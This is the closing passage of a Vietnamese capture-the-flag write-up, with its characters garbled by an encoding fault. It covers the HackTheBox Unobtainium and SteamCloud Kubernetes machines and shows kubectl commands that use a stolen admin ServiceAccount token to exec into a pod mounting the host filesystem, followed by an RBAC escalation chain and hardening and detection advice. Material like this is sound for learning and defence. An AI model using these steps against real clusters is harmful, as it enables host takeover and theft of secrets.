  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt
```

Exec v�o pod:

```bash
kubectl exec evil-pod --stdin --tty -n kube-system \
  --token $(cat cadmin-token) \
  --server https://10.10.10.235:8443 \
  --certificate-authority ca.crt \
  -- /bin/sh
```

�?c root flag:

```bash
cd /mnt/root
cat root.txt
```

### 13. �i?m kh�c v?i SteamCloud

| N?i dung | SteamCloud | Unobtainium |
|---|---|---|
| Initial K8s access | Kubelet API cho exec tr?c ti?p v�o nginx | RCE webapp qua app vuln |
| Token d?u ti�n | Token trong nginx pod | Token trong webapp pod |
| RBAC ban d?u | C� `create pods` ngay trong default | Ch? list namespace, list pod ? dev |
| Pivot ch�nh | T?o pod mount hostPath tr?c ti?p | Pivot sang dev pod, l?y dev token |
| L?i RBAC n?ng | `create pods` qu� r?ng | dev token d?c du?c secrets ? kube-system |
| Admin token | Kh�ng c?n admin token | �?c `c-admin-token` t? kube-system |
| Root host | Pod mount `/` c?a host | Pod mount `/` c?a host |

### 14. B�i h?c RBAC cho d? t�i VDT

Unobtainium minh h?a r?t r� m?t chu?i leo thang ki?u th?c t?:

```text
Pod compromise
? d?c ServiceAccount token
? ki?m tra RBAC t?ng namespace
? t�m namespace c� quy?n kh�c thu?ng
? pivot sang workload kh�c
? l?y token m?i
? d?c secrets nh?y c?m
? chi?m ServiceAccount admin
? t?o pod d?c h?i
? host filesystem access
```

C�c l?i c?u h�nh ch�nh:

- Pod du?c t? d?ng mount ServiceAccount token d� app kh�ng ch?c c?n g?i API Server.
- ServiceAccount `default` c� quy?n list namespace v� list pods ? `dev`, gi�p attacker kh�m ph� lateral movement path.
- ServiceAccount ? `dev` c� quy?n `get/list secrets` trong `kube-system`, d�y l� quy?n c?c k? nguy hi?m.
- Secret ki?u `kubernetes.io/service-account-token` ch?a token c� th? d�ng ngay d? impersonate ServiceAccount tuong ?ng.
- Kh�ng c� policy ch?n pod mount `hostPath: /`.

### 15. Hardening / Detection

Hardening n�n ghi v�o b�o c�o:

- Kh�ng d�ng ServiceAccount `default` cho workload th?t.
- T?t mount token n?u app kh�ng c?n:

```yaml
automountServiceAccountToken: false
```

- RBAC least privilege theo namespace, kh�ng c?p `get/list secrets` tr? khi th?t s? c?n.
- Tuy?t d?i h?n ch? quy?n d?c secrets trong `kube-system`.
- D�ng short-lived bound tokens thay v� long-lived ServiceAccount token secret n?u c� th?.
- B?t Pod Security Admission/Kyverno/Gatekeeper d? ch?n:
  - `hostPath` mount `/`
  - `hostNetwork: true`
  - `privileged: true`
  - pod ch?y root kh�ng c?n thi?t
- Audit API Server cho c�c h�nh vi:
  - `get/list secrets` trong `kube-system`
  - `describe/get secret *-token-*`
  - t?o pod m?i c� `hostPath`
  - `kubectl exec` b?t thu?ng
- Falco/Tetragon rule n�n ch� �:
  - Process trong container d?c `/run/secrets/kubernetes.io/serviceaccount/token`.
  - Container mount host root filesystem.
  - Shell du?c spawn trong container ?ng d?ng.

### 16. Takeaway

Unobtainium l� v� d? hay hon SteamCloud cho ph?n **leo thang d?c quy?n theo chu?i RBAC**. Attacker kh�ng c� quy?n admin ngay t? d?u, nhung b?ng c�ch d?c token trong pod, ki?m tra quy?n theo t?ng namespace, pivot sang pod kh�c v� l?m d?ng quy?n d?c secrets trong `kube-system`, cu?i c�ng v?n l?y du?c token admin v� t?o pod mount filesystem host.



## K?t th�c 

Th� d�y l� c�c b�i lab m� tui h?c du?c trong qu� tr�nh t�m hi?u v? ki thu?t khai th�c leo thang d?c quy?n tr�n K8s , th� ch? y?u d?u khai th�c do misconfig v� l?i RBAC c?p quy?n qu� r?ng. Qua d� c� th? th?y r?ng n?u trong m�i tru?ng th?c t? , c�c l? h?ng d�i khi kh�ng d?n t? c�c zero-day m� d?n t? b?n th�n con ngu?i. H�m nay t?i d�y thui, h?n c�c b?n ? b�i s?p t?i !!!!.




